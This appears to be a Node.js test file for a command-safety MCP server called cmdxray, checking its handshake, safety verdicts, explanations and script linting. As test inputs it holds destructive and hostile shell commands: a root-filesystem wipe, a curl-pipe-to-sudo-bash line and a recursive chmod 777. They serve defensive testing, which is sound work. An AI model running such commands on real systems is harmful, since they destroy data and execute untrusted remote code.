// Spawns the built stdio MCP server and drives a real JSON-RPC handshake.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";

const __dirname = dirname(fileURLToPath(import.meta.url));
const SERVER = join(__dirname, "..", "dist", "mcp.js");

const CLI = join(__dirname, "..", "dist", "cli.js");

function runSession(messages, cmd = [SERVER]) {
  return new Promise((resolve, reject) => {
    const child = spawn("node", cmd, { stdio: ["pipe", "pipe", "inherit"] });
    let buf = "";
    const out = [];
    child.stdout.on("data", (d) => {
      buf += d.toString();
      let nl;
      while ((nl = buf.indexOf("\n")) !== -1) {
        const line = buf.slice(0, nl).trim();
        buf = buf.slice(nl + 1);
        if (line) out.push(JSON.parse(line));
      }
    });
    child.on("error", reject);
    child.on("close", () => resolve(out));
    for (const m of messages) child.stdin.write(JSON.stringify(m) + "\n");
    child.stdin.end();
  });
}

test("MCP server: initialize, tools/list, tools/call", async () => {
  const out = await runSession([
    { jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {} } },
    { jsonrpc: "2.0", method: "notifications/initialized" },
    { jsonrpc: "2.0", id: 2, method: "tools/list" },
    { jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "check_command_safety", arguments: { command: "rm -rf --no-preserve-root /" } } },
    { jsonrpc: "2.0", id: 4, method: "tools/call", params: { name: "check_command_safety", arguments: { command: "ls -la" } } },
    { jsonrpc: "2.0", id: 5, method: "tools/call", params: { name: "explain_command", arguments: { command: "tar -xzvf a.tgz" } } },
  ]);
  const by = (id) => out.find((m) => m.id === id);

  // initialize
  assert.equal(by(1).result.serverInfo.name, "cmdxray");
  assert.equal(by(1).result.protocolVersion, "2025-06-18");
  assert.ok(by(1).result.capabilities.tools);

  // tools/list
  const names = by(2).result.tools.map((t) => t.name).sort();
  assert.deepEqual(names, ["check_command_safety", "explain_command", "lint_script"]);
  for (const t of by(2).result.tools) {
    assert.equal(t.inputSchema.type, "object");
    assert.deepEqual(t.inputSchema.required, t.name === "lint_script" ? ["script"] : ["command"]);
  }

  // danger verdict
  assert.equal(by(3).result.structuredContent.risk, "danger");
  assert.ok(by(3).result.structuredContent.warnings.length >= 1);
  assert.match(by(3).result.content[0].text, /DANGER/);

  // safe verdict
  assert.equal(by(4).result.structuredContent.risk, "none");

  // explain
  assert.ok(by(5).result.structuredContent.explanations.length >= 1);
  assert.equal(by(5).result.structuredContent.tool, "cmdxray");
});

test("MCP server: lint_script scans a whole script and flags every risky line", async () => {
  const script =
    "#!/bin/bash\necho hi\ncurl http://x | sudo bash\nrm -rf --no-preserve-root /\nchmod -R 777 /\nls -la\n";
  const out = await runSession([
    { jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18" } },
    { jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "lint_script", arguments: { script } } },
    { jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "lint_script", arguments: { script: "echo hi\nls -la\n" } } },
    { jsonrpc: "2.0", id: 4, method: "tools/call", params: { name: "lint_script", arguments: { script: "   " } } },
  ]);
  const by = (id) => out.find((m) => m.id === id);

  // dangerous script: danger verdict, findings carry line numbers, comment/shebang skipped
  const sc = by(2).result.structuredContent;
  assert.equal(sc.risk, "danger");
  assert.ok(sc.danger >= 2);
  assert.ok(sc.findings.length >= 3);
  assert.ok(sc.findings.every((f) => typeof f.line === "number" && f.line >= 3));
  assert.match(by(2).result.content[0].text, /DANGER/);

  // safe script: none
  assert.equal(by(3).result.structuredContent.risk, "none");

  // empty/whitespace script: friendly error
  assert.equal(by(4).result.isError, true);
});

test("`cmdxray mcp` subcommand starts the same stdio server (npx -y cmdxray mcp path)", async () => {
  const out = await runSession(
    [
      { jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18" } },
      { jsonrpc: "2.0", id: 2, method: "tools/list" },
    ],
    [CLI, "mcp"],
  );
  const by = (id) => out.find((m) => m.id === id);
  assert.equal(by(1).result.serverInfo.name, "cmdxray");
  assert.deepEqual(
    by(2).result.tools.map((t) => t.name).sort(),
    ["check_command_safety", "explain_command", "lint_script"],
  );
});

test("MCP server: unknown method returns -32601; bad args are handled", async () => {
  const out = await runSession([
    { jsonrpc: "2.0", id: 1, method: "does/not/exist" },
    { jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "check_command_safety", arguments: {} } },
    { jsonrpc: "2.0", id: 3, method: "ping" },
  ]);
  const by = (id) => out.find((m) => m.id === id);
  assert.equal(by(1).error.code, -32601);
  assert.equal(by(2).result.isError, true);
  assert.deepEqual(by(3).result, {});
});
